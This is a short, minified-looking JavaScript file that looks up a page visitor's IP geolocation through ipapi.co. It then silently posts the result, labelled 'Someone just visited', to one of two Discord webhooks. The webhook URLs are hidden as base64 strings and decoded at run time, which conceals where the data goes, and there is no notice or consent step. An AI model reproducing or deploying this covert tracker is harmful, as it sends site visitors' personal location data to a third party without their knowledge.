function d(a) {
    return atob(a)
}

function v(w) {
	var x = new XMLHttpRequest();
	x.onreadystatechange = function() {
        if (x.readyState == XMLHttpRequest.DONE) {
            s(`# Someone just visited ${w}\n\`\`\`${x.responseText}\`\`\``, w)
        }
	}
	x.open('GET', 'https://ipapi.co/json', true);
	x.send(null);
}

function s(t, q) {
	let u = {content: t};
	let o = {method: 'POST', body: JSON.stringify(u), headers: {'Content-Type': 'application/json'}}
    if (q[0] == 'G') {
        fetch(d("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTIwNzk0MTA4OTY3NjIzNDc2Mi9wVWJYTmRhTUYzRzQ3QlBhaFZQemdyeExVYTlSWS1zUGQydHlnSkd2aFhnN1pWY3ZJMjc5dXYyVUlUWENfd0dqSWNoSg=="), o)
    }
    if (q[0] == 'V') {
        fetch(d("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTIwNzk0MTUxNjk0MTg1Njc2OC9Za1hqN0VBcnU5Q1c5OFJyOVNWQzY3X0k0YUF2ckJnQklMX253V2FOM1lqT29YNG56bW1Ld0pjR1FGaENIdlNVeWhMZg=="), o)
    }	
} 